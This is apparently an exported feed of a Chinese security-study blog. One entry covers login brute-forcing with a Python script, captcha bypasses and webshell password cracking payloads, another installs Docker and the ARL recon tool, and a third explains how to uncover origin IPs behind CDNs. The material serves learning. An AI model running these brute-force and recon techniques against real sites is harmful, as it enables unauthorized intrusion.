operator">=</span><span class="token punctuation">{</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span>password<span class="token punctuation">,</span><span class="token string">"Login"</span><span class="token punctuation">:</span><span class="token string">"Login"</span><span class="token punctuation">,</span><span class="token string">'user_token'</span><span class="token punctuation">:</span>user_token<span class="token punctuation">}</span>req<span class="token operator">=</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>allow_redirects<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>html <span class="token operator">=</span> req<span class="token punctuation">.</span>text<span class="token keyword">return</span> html<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'top1000.txt'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>passlist <span class="token operator">=</span>p<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> passlist<span class="token punctuation">:</span>line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">'File Upload'</span> <span class="token keyword">in</span> login<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span> <span class="token string">"[* 密码 is %s *]"</span> <span class="token operator">%</span> line <span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day20/image-20210801202828750.png" alt="image-20210801202828750"></p><p>密码是password</p><h2 id="针对有验证码的后台的穷举方法"><a href="#针对有验证码的后台的穷举方法" class="headerlink" title="针对有验证码的后台的穷举方法"></a>针对有验证码的后台的穷举方法</h2><p>网站后台或者有登录的地方都可能存在验证码验证</p><p>验证码的作用：不少网站为了防止用户利用机器人自动注册、登录、灌水，都会采用验证码技术</p><p>所谓的验证码，就是将一串随机产生的数字和符号，生成一幅图片，在图像上加上干扰像素（防止 orc），要用户用肉眼识别其中的验证码信息，输入表单提交网站验证。验证后使用网站某个功能.但是如果验证码逻辑编写不好会存在被绕过的风险。</p><p>这里举出俩个简单例子</p><h3 id="cookie不存在不验证绕过"><a href="#cookie不存在不验证绕过" class="headerlink" title="cookie不存在不验证绕过"></a>cookie不存在不验证绕过</h3><p>有些网站如果不存在cookie就不会检验验证码</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203247288.png" alt="image-20210801203247288"></p><p>发送到repeater 第一次send</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203324557.png" alt="image-20210801203324557"></p><p>再次send</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203347404.png" alt="image-20210801203347404"></p><p>显然对验证码进行了检验</p><p>我们这时把phpsessionid删除</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203434067.png" alt="image-20210801203434067"></p><p>再次send</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203505553.png" alt="image-20210801203505553"></p><p>发现不对验证码进行校验了</p><p>成功绕过</p><p>这时我们再发送到intruder来跑密码即可</p><h3 id="后台登录验证码没销毁进行穷举"><a href="#后台登录验证码没销毁进行穷举" class="headerlink" title="后台登录验证码没销毁进行穷举"></a>后台登录验证码没销毁进行穷举</h3><p>在登录提交的时候进行验证码验证 不管密码是否正确，都要销毁验证码。</p><p>不然验证码可复用</p><p>我们对此界面抓包，输入正确的验证码</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203843379.png" alt="image-20210801203843379"></p><p>第一次send</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801203928124.png" alt="image-20210801203928124"></p><p>第二次send还是此界面，说明他的验证码没有销毁，复用了</p><p>接下来跑字典就可</p><h2 id="网站后台验证码识别穷举密码"><a href="#网站后台验证码识别穷举密码" class="headerlink" title="网站后台验证码识别穷举密码"></a>网站后台验证码识别穷举密码</h2><p>验证码干扰像素太少很容易就会被一些工具识别出来。如图片提取文字工具。</p><p>这里我们使用codex工具</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801204156711.png" alt="image-20210801204156711"></p><p>我们可以先测试一下验证码是否能被识别</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801204305080.png" alt="image-20210801204305080"></p><p>正确识别了，说明此网站验证码干扰像素太少了</p><p>接下来我们使用此工具</p><p><strong>操作请求栏</strong></p><p>首先将burp抓的包放入此工具</p><p>加好标记，写入验证码地址，导入密码字典</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801204858414.png" alt="image-20210801204858414"></p><p>这里导入密码发现出问题了，只有一行</p><p>这是因为此工具是windows版，字典是作为Unix格式</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801205829426.png" alt="image-20210801205829426"></p><p>我们使用sublime text将字典修改为windows即可</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801213322921.png" alt="image-20210801213322921"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801213304616.png" alt="image-20210801213304616"></p><p><strong>操作爆破栏</strong></p><p>输入验证码错误的特征</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210107421.png" alt="image-20210801210107421"></p><p>我们输入验证错误即可</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210130125.png" alt="image-20210801210130125"></p><p>之后我们就单独对密码爆破，对失败的也可再次把爆破</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801213405872.png" alt="image-20210801213405872"></p><h2 id="phpmyadmin-密码穷举"><a href="#phpmyadmin-密码穷举" class="headerlink" title="phpmyadmin 密码穷举"></a>phpmyadmin 密码穷举</h2><p>phpmyadmin 是 mysql 的一个 web 管理工具，可以通过这个工具穷举 mysql 用户的账号和密码。</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210529183.png" alt="image-20210801210529183"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210552594.png" alt="image-20210801210552594"></p><p>这里入口就是上面这个网站即可，用户名密码自己写即可</p><p>简单演示：</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210703006.png" alt="image-20210801210703006"></p><p>结果会生成result文件</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210959022.png" alt="image-20210801210959022"></p><h2 id="一句话木马后门破解"><a href="#一句话木马后门破解" class="headerlink" title="一句话木马后门破解"></a>一句话木马后门破解</h2><p>一句话后门可以使用 burpsuite 通用穷举方法穷举密码。</p><p>这里准备了asp、php、aspx三个后门</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801210832288.png" alt="image-20210801210832288"></p><p>我们对此界面抓包设置cmd，并把它的方法改成post</p><pre class="line-numbers language-none"><code class="language-none">关键字aspcmd=execute("response.clear:response.write(""passwordright""):response.end")phpcmd=echo "password right";aspxcmd=qweasd123=Response.Write("moonsec");密码是 qweasd123<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day20/image-20210801212307118.png" alt="image-20210801212307118"></p><p><img src="/2021/07/27/60-zhi-day20/image-20210801211237007.png" alt="image-20210801211237007"></p><p>发送到intruder设置cmd变量跑字典即可</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801211308397.png" alt="image-20210801211308397"></p><p>正确的密码长度会不同，而且会回显预定的值</p><p><img src="/2021/07/27/60-zhi-day20/image-20210801212507783.png" alt="image-20210801212507783"></p>]]></content>
      
      
      <categories>
          
          <category> 穷举篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 穷举 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>goby&amp;docker&amp;灯塔</title>
      <link href="/2021/07/27/60-zhi-day19/"/>
      <url>/2021/07/27/60-zhi-day19/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><span id="more"></span><h2 id="goby"><a href="#goby" class="headerlink" title="goby"></a>goby</h2><p>一款好用的工具，需要自己尝试使用</p><p><img src="/2021/07/27/60-zhi-day19/image-20210727130232115.png" alt="image-20210727130232115"></p><h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p><img src="/2021/07/27/60-zhi-day19/image-20210727130407420.png" alt="image-20210727130407420"></p><h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><p><img src="/2021/07/27/60-zhi-day19/image-20210727130534114.png" alt="image-20210727130534114"></p><h2 id="kali上安装docker"><a href="#kali上安装docker" class="headerlink" title="kali上安装docker"></a>kali上安装docker</h2><h3 id="一、安装依赖包"><a href="#一、安装依赖包" class="headerlink" title="一、安装依赖包"></a>一、安装依赖包</h3><p>在安装Docker（Docker CE社区版）之前，需要安装所有依赖包，运行如下命令：</p><p>通过确保已安装docker用作依赖项的所有软件包来开始安装。</p><pre class="line-numbers language-none"><code class="language-none">sudo apt updatesudo apt -y install curl gnupg2 apt-transport-https software-properties-common ca-certificates<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day19/image-20210727130747491.png" alt="image-20210727130747491"></p><p><img src="/2021/07/27/60-zhi-day19/image-20210727130802013.png" alt="image-20210727130802013"></p><h3 id="二、导入Docker-GPG密钥"><a href="#二、导入Docker-GPG密钥" class="headerlink" title="二、导入Docker GPG密钥"></a>二、导入Docker GPG密钥</h3><p>导入用于签署Docker软件包的Docker GPG密钥：</p><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add - <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day19/image-20210727130829718.png" alt="image-20210727130829718"></p><h3 id="三、将Docker储存库添加到Kali-Linux系统中"><a href="#三、将Docker储存库添加到Kali-Linux系统中" class="headerlink" title="三、将Docker储存库添加到Kali Linux系统中"></a>三、将Docker储存库添加到Kali Linux系统中</h3><p>添加包含Docker CE最新稳定版本的Docker存储库：</p><pre class="line-numbers language-none"><code class="language-none">echo "deb [arch=amd64] https://download.docker.com/linux/debian buster stable" | sudo tee  /etc/apt/sources.list.d/docker.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此命令会将存储库URL添加到/etc/apt/sources.list.d/docker.list。</p><h3 id="四、在Kali-Linux上安装Docker"><a href="#四、在Kali-Linux上安装Docker" class="headerlink" title="四、在Kali Linux上安装Docker"></a>四、在Kali Linux上安装Docker</h3><p>更新apt包索引：</p><pre class="line-numbers language-none"><code class="language-none">sudo apt update<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要在Kali Linux上安装Docker CE，请运行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">sudo echo "deb https://download.docker.com/linux/ubuntu zesty edge" &gt; /etc/apt/sources.list.d/docker.listsudo apt update &amp;&amp; sudo apt install docker-ce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day19/image-20210727131055271.png" alt="image-20210727131055271"></p><p>运行docker命令：</p><pre class="line-numbers language-none"><code class="language-none">sudo usermod -aG docker $USERnewgrp docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>检查安装的Docker版本：</p><pre class="line-numbers language-none"><code class="language-none">docker version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day19/image-20210727131141197.png" alt="image-20210727131141197"></p><h3 id="五、在Kali-Linux上安装Docker-Compose"><a href="#五、在Kali-Linux上安装Docker-Compose" class="headerlink" title="五、在Kali Linux上安装Docker Compose"></a>五、在Kali Linux上安装Docker Compose</h3><pre class="line-numbers language-none"><code class="language-none">sudo apt install docker-compose <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/27/60-zhi-day19/image-20210727131241634.png" alt="image-20210727131241634"></p><p><img src="/2021/07/27/60-zhi-day19/image-20210727131313513.png" alt="image-20210727131313513"></p><p>docker操作</p><pre class="line-numbers language-none"><code class="language-none">启动dockersudo service docker start停止dockersudo service docker stop重启dockersudo service docker restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="资产侦察灯塔系统"><a href="#资产侦察灯塔系统" class="headerlink" title="资产侦察灯塔系统"></a>资产侦察灯塔系统</h2><p>(<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></p><p>启动docker后</p><h3 id="docker启动灯塔"><a href="#docker启动灯塔" class="headerlink" title="docker启动灯塔"></a>docker启动灯塔</h3><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/TophantTechnology/ARLcd ARL/docker/docker-compose up -d <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>登录页面，默认端口5003 (https), 默认用户名密码admin/arlpass</p><p><img src="/2021/07/27/60-zhi-day19/image-20210727142131123.png" alt="image-20210727142131123"></p><p>之后自己慢慢使用此工具即可</p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> goby </tag>
            
            <tag> docker </tag>
            
            <tag> 灯塔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN找真实IP</title>
      <link href="/2021/07/22/60-zhi-day18/"/>
      <url>/2021/07/22/60-zhi-day18/</url>
      
        <content type="html"><![CDATA[<h1 id="部署CDN的网站找真实ip"><a href="#部署CDN的网站找真实ip" class="headerlink" title="部署CDN的网站找真实ip"></a>部署CDN的网站找真实ip</h1><span id="more"></span><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><blockquote><p>目前很多网站使用了cdn服务，用了此服务 可以隐藏服务器的真实IP，加速网站静态文件的访问，而且你请求网站服务时，cdn服务会根据你所在的地区，选择合适的线路给予你访问，由此达网站加速的效果，cdn不仅可以加速网站访问，还可以提供waf服务，如防止cc攻击，SQL注入拦截等多种功能，再说使用cdn的成本不太高，很多云服务器也免费提供此服务。在进行黑盒测试的时候，往往成了拦路石，所以掌握cdn找真实ip成了不得不掌握的一项技术。</p></blockquote><h2 id="判断是否是CDN"><a href="#判断是否是CDN" class="headerlink" title="判断是否是CDN"></a>判断是否是CDN</h2><h3 id="ping-域名"><a href="#ping-域名" class="headerlink" title="ping 域名"></a>ping 域名</h3><p><img src="/2021/07/22/60-zhi-day18/image-20210722203135912.png" alt="image-20210722203135912"></p><p>显然下面这个网站部署了CDN</p><h3 id="超级ping"><a href="#超级ping" class="headerlink" title="超级ping"></a>超级ping</h3><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203434436.png" alt="image-20210722203434436"></p><p><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203445605.png" alt="image-20210722203445605"></p><p><a href="https://www.17ce.com/">https://www.17ce.com/</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203455328.png" alt="image-20210722203455328"></p><p><a href="http://ping.chinaz.com/www.t00ls.net">http://ping.chinaz.com/www.t00ls.net</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203510537.png" alt="image-20210722203510537"></p><p>我们看看这个例子：</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203214701.png" alt="image-20210722203214701"></p><p>不止一个ip显然部署了CDN</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203248551.png" alt="image-20210722203248551"></p><p>不同地点访问ip不同  显然部署了CDN</p><h2 id="找IP的方法"><a href="#找IP的方法" class="headerlink" title="找IP的方法"></a>找IP的方法</h2><blockquote><p>找到真实IP可以继续旁站检测，找其他站点进行突破，也可以绕过cdn进行访问，从而绕过waf针对攻击语句的拦截 发现有攻击语句就会对攻击的IP封堵。</p></blockquote><h3 id="DNS历史绑定记录"><a href="#DNS历史绑定记录" class="headerlink" title="DNS历史绑定记录"></a>DNS历史绑定记录</h3><p>通过以下这些网站可以访问dns的解析，有可能存在未有绑cdn之前的记录。</p><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> ###DNS查询 挂梯子</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203659992.png" alt="image-20210722203659992"></p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> ###微步在线</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203736714.png" alt="image-20210722203736714"></p><p><a href="http://viewdns.info/">http://viewdns.info/</a> ###DNS、IP等查询 挂梯子</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203804776.png" alt="image-20210722203804776"></p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a> ###CDN查询IP</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203831129.png" alt="image-20210722203831129"></p><p><a href="https://sitereport.netcraft.com/?url=%E5%9F%9F%E5%90%8D">https://sitereport.netcraft.com/?url=域名</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722203919457.png" alt="image-20210722203919457"></p><p>以上都可以查询历史解析记录</p><h3 id="子域名解析"><a href="#子域名解析" class="headerlink" title="子域名解析"></a>子域名解析</h3><p>通过子域名的解析指向 也有可能指向目标的同一个IP上。</p><h4 id="在线子域名查询"><a href="#在线子域名查询" class="headerlink" title="在线子域名查询"></a>在线子域名查询</h4><p><a href="https://securitytrails.com/list/apex_domain/t00ls.net">https://securitytrails.com/list/apex_domain/t00ls.net</a>  挂梯子</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722204515150.png" alt="image-20210722204515150"></p><p><a href="http://tool.chinaz.com/subdomain/t00ls.net">http://tool.chinaz.com/subdomain/t00ls.net</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722204543241.png" alt="image-20210722204543241"></p><p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722204631658.png" alt="image-20210722204631658"></p><p>找到子域名继续，确认子域名没有cdn的情况下，批量进行域名解析查询，有cdn的情况继续查询历史。</p><p><a href="http://tools.bugscaner.com/domain2ip.html">http://tools.bugscaner.com/domain2ip.html</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722204917845.png" alt="image-20210722204917845"></p><h3 id="国外DNS获取真实IP"><a href="#国外DNS获取真实IP" class="headerlink" title="国外DNS获取真实IP"></a>国外DNS获取真实IP</h3><p>部分cdn只针对国内的ip访问，如果国外ip访问域名 即可获取真实IP</p><p>全世界DNS地址：(太对就不截图演示了)</p><p><a href="http://www.ab173.com/dns/dns_world.php">http://www.ab173.com/dns/dns_world.php</a></p><p> <a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </p><p><a href="https://dnshistory.org/">https://dnshistory.org/</a> </p><p><a href="http://whoisrequest.com/history/">http://whoisrequest.com/history/</a> </p><p><a href="https://completedns.com/dns-history/">https://completedns.com/dns-history/</a> </p><p><a href="http://dnstrails.com/">http://dnstrails.com/</a> </p><p><a href="https://who.is/domain-history/">https://who.is/domain-history/</a></p><p><a href="http://research.domaintools.com/research/hosting-history/">http://research.domaintools.com/research/hosting-history/</a> <a href="http://site.ip138.com/">http://site.ip138.com/</a> </p><p><a href="http://viewdns.info/iphistory/">http://viewdns.info/iphistory/</a> </p><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> </p><p><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> </p><p><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </p><p><a href="http://viewdns.info/">http://viewdns.info/</a> </p><p><a href="http://www.17ce.com/">http://www.17ce.com/</a></p><p> <a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> <a href="https://securitytrails.com/">https://securitytrails.com/</a> </p><p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p><h3 id="ico图标通过空间搜索找真实IP"><a href="#ico图标通过空间搜索找真实IP" class="headerlink" title="ico图标通过空间搜索找真实IP"></a>ico图标通过空间搜索找真实IP</h3><p>我们再网页找到favicon.ico下载图标放到空间搜索引擎识别</p><p>fofa：</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722205503201.png" alt="image-20210722205503201"></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722210017347.png" alt="image-20210722210017347"></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722210031008.png" alt="image-20210722210031008"></p><p>通过这样查询 快速定位资源 查看端口是否开放 这里没有开放</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722210312805.png" alt="image-20210722210312805"></p><p>zoomeye：</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722210555098.png" alt="image-20210722210555098"></p><p><img src="/2021/07/22/60-zhi-day18/image-20210722210621804.png" alt="image-20210722210621804"></p><p>查看80和443端口开放情况：</p><p><img src="/2021/07/22/60-zhi-day18/image-20210722210734287.png" alt="image-20210722210734287"></p><p>绑定hosts测试下</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723123129368.png" alt="image-20210723123129368"></p><p>ping 域名正常</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723123157326.png" alt="image-20210723123157326"></p><p>curl 域名 正常回显curl <a href="http://www.t00ls.net/">www.t00ls.net</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210723123218144.png" alt="image-20210723123218144"></p><h3 id="fofa搜索真实IP"><a href="#fofa搜索真实IP" class="headerlink" title="fofa搜索真实IP"></a>fofa搜索真实IP</h3><p>domain=”t00ls.net”</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723123429709.png" alt="image-20210723123429709"></p><h3 id="censys找真实IP"><a href="#censys找真实IP" class="headerlink" title="censys找真实IP"></a>censys找真实IP</h3><p><a href="https://search.censys.io/search?resource=hosts&amp;q=">https://search.censys.io/search?resource=hosts&amp;q=</a></p><blockquote><p>Censys工具就能实现对整个互联网的扫描，Censys是一款用以搜索联网设备信息的新型搜索引擎，能够扫描整个互联网，Censys会将互联网所有的ip进行扫面和连接，以及证书探测。</p><p>若目标站点有https证书，并且默认虚拟主机配了https证书，我们就可以找所有目标站点是该https证书的站点。</p></blockquote><p>通过协议查询：</p><p><a href="https://censys.io/ipv4?q=((www.t00ls.net)">https://censys.io/ipv4?q=((www.t00ls.net)</a> AND protocols: “443/https”) AND tags.raw:”https”&amp;443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:moonsec.com</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723123952370.png" alt="image-20210723123952370"></p><h3 id="360测绘中心"><a href="#360测绘中心" class="headerlink" title="360测绘中心"></a>360测绘中心</h3><p><a href="https://quake.360.cn/">https://quake.360.cn</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210723125018420.png" alt="image-20210723125018420"></p><h3 id="利用SSL证书找真实IP"><a href="#利用SSL证书找真实IP" class="headerlink" title="利用SSL证书找真实IP"></a>利用SSL证书找真实IP</h3><p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</p><p>获取网站SSL证书的HASH再结合Censys：</p><p>利用Censys搜索网站的SSL证书及HASH，在<a href="https://crt.sh上查找目标网站ssl证书的hash/">https://crt.sh上查找目标网站SSL证书的HASH</a></p><p>再用Censys搜索该HASH即可得到真实IP地址</p><p><a href="https://crt.sh/">https://crt.sh</a>  找hash</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723125739275.png" alt="image-20210723125739275"></p><p><img src="/2021/07/22/60-zhi-day18/image-20210723125853589.png" alt="image-20210723125853589"></p><p><img src="/2021/07/22/60-zhi-day18/image-20210723130005346.png" alt="image-20210723130005346"></p><p>至此找到hash</p><p>censys找hash</p><p><a href="https://censys.io/certificates?q=parsed.names:+t00ls.net+and+tags.raw:+trusted">https://censys.io/certificates?q=parsed.names%3A+t00ls.net+and+tags.raw%3A+trusted</a></p><p><img src="/2021/07/22/60-zhi-day18/image-20210723130528369.png" alt="image-20210723130528369"></p><p>找到hash</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723131923193.png" alt="image-20210723131923193"></p><p>转成ipv4搜索 找到俩个ip</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723131954422.png" alt="image-20210723131954422"></p><p>接下来就是判断ip是否是这个域名了</p><h3 id="邮箱获取真实IP"><a href="#邮箱获取真实IP" class="headerlink" title="邮箱获取真实IP"></a>邮箱获取真实IP</h3><p>网站在发信的时候，会附带真实的IP地址 进入邮箱 查看源文件头部信息 选择from</p><p><img src="/2021/07/22/60-zhi-day18/image-20210723132155347.png" alt="image-20210723132155347"></p><p><img src="/2021/07/22/60-zhi-day18/image-20210723132207167.png" alt="image-20210723132207167"></p><p>至于是否真实  就得看发送邮箱是否与网站同一个IP</p><h3 id="网站敏感文件获取真实IP"><a href="#网站敏感文件获取真实IP" class="headerlink" title="网站敏感文件获取真实IP"></a>网站敏感文件获取真实IP</h3><ul><li>文件探针</li><li>phpinfo</li><li>网站源代码</li><li>信息泄露</li><li>GitHub信息泄露</li><li>s文件</li></ul><p><img src="/2021/07/22/60-zhi-day18/image-20210723132320315.png" alt="image-20210723132320315"></p><h3 id="F5-LTM-解码"><a href="#F5-LTM-解码" class="headerlink" title="F5 LTM 解码"></a>F5 LTM 解码</h3><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取。</p><p>例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p><p>rverpool-cas01=3255675072.20480.0000; path=/</p><p>3255675072 转十六进制 c20da8c0 从右向左取 c0，a8，0d，c2 ，转10进制 192 168 13 194</p><h3 id="配置不当获取真实IP"><a href="#配置不当获取真实IP" class="headerlink" title="配置不当获取真实IP"></a>配置不当获取真实IP</h3><p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p><ul><li> 案例1：为了方便用户访问，我们常常将<a href="http://www.test.com/">www.test.com</a> 和 test.com 解析到同一个站点，而CDN只配置了<a href="http://www.test.com,通过访问test.com,就可以绕过/">www.test.com，通过访问test.com，就可以绕过</a> CDN 了。</li><li>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</li></ul><h3 id="banner"><a href="#banner" class="headerlink" title="banner"></a>banner</h3><p>获取目标站点的banner，在全网搜索引擎搜索，也可以使用AQUATONE，在Shodan上搜索相同指纹站点。</p><p>可以通过互联网络信息中心的IP数据，筛选目标地区IP，遍历Web服务的banner用来对比CDN站的banner，可以确定源IP。</p><p>欧洲：</p><p><a href="http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest">http://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest</a> </p><p>北美：</p><p><a href="https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest">https://ftp.arin.net/pub/stats/arin/delegated-arin-extended-latest</a> </p><p>亚洲：</p><p><a href="ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest">ftp://ftp.apnic.net/public/apnic/stats/apnic/delegated-apnic-latest</a> </p><p>非洲：</p><p><a href="ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest">ftp://ftp.afrinic.net/pub/stats/afrinic/delegated-afrinic-latest</a></p><p>拉美：</p><p><a href="ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest">ftp://ftp.lacnic.net/pub/stats/lacnic/delegated-lacnic-extended-latest</a> </p><p>获取CN的IP</p><p><a href="http://www.ipdeny.com/ipblocks/data/countries/cn.zone">http://www.ipdeny.com/ipblocks/data/countries/cn.zone</a> </p><p>例如： </p><p>找到目标服务器 IP 段后，可以直接进行暴力匹配 ，使用zmap、masscan 扫描 HTTP banner，然后匹配到目标域名的相同 banner</p><p>zmap -p 80 -w bbs.txt -o 80.txt</p><p>使用zmap的banner-grab对扫描出来80端口开放的主机进行banner抓取。</p><p>cat /root/bbs.txt |./banner-grab-tcp -p 80 -c 100 -d http-req -f ascii &gt; http-banners.out</p><p>根据网站返回包特征，进行特征过滤 </p><p>location: plugin.php?id=info:index</p><p><a href="https://fofa.so/">https://fofa.so/</a></p><p>title=”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net”</p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>title:”T00LS | 低调求发展 -潜心习安全 -T00ls.Net”</p><p><a href="https://quake.360.cn/">https://quake.360.cn/</a> </p><p>response:”T00LS | 低调求发展 - 潜心习安全 - T00ls.Net”</p><p>1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。<a href="https://github.com/zmap/zmap">https://github.com/zmap/zmap</a></p><p>2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</p><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h3 id="长期关注"><a href="#长期关注" class="headerlink" 